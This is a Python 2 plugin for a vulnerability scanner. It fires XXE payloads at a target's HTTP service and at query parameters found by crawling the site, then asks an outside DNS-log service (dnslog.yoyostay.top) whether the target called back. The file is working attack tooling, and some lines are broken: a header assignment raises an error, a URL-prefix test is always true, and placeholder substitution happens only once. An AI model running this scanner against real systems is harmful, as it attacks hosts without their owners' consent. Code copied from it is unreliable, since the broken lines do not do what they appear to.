# coding=utf-8
import urllib2
import re
import time
import urllib
import requests
import urlparse
import HTMLParser
from config import *


def get_url(domain, timeout):
    url_list = []
    try:
        res = urllib2.urlopen('http://' + domain, timeout=timeout)
    except Exception as e:
        return []
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))


def check(domain):
    try:
        url = 'http://dnslog.yoyostay.top/api/dns/devil/{}/'
        resp = requests.get(url.format(domain)).content 
        if 'True' in resp:
            return True
    except:
        return False

    return False



def verify(ip, port=80, name='', timeout=10, types='ip'):
    if 'http' not in name.lower():
        return

    if types == 'ip':
        url = ip + ':' + str(port)
    else:
        url = ip

    domain = url.replace(':', '_').replace('.','_')

    if not url.startswith('http:/') or not url.startswith('https:/'):
        posturl = 'http://' + url
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
        'Content-Type': 'text/html'
    }

    # info
    info = {
        'url': posturl,
        'vuln_name': 'xxe',
        'severity': 'high',
        'proof': '',
    }


    # post
    for payload in XXE_PAYLOAD:
        for ct in ['application/xml', 'text/xml']:
            headers['Content-Type'] = ct
            payload = payload.replace('{domain}', domain)
            try:
                resp = requests.post(posturl, data=payload, headers=headers, verify=False, timeout=10)
            except Exception as e:
                continue

    # check
    if check(domain):
        info['proof'] = domain
        return info



    urllist = get_url(url, 10)
    for url in urllist:
        parsed_url = urlparse.urlparse(url)
        if not parsed_url.query:
            continue

        xxe_payloads = getPayload(parsed_url.query, 'xxe')

        for payload in xxe_payloads:
            query = urllib.urlencode(payload).replace('{domain}', domain)
            target = urlparse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, query, parsed_url.fragment))
            try:
                headers['Content-Type': 'application/xml']
                resp = requests.get(target, headers=headers, verify=False, timeout=10)
                if resp.status_code != 200:
                    break
            except Exception as e:
                continue

        if check(domain):
            info['url'] = url 
            info['proof'] = domain
            return info

    return None

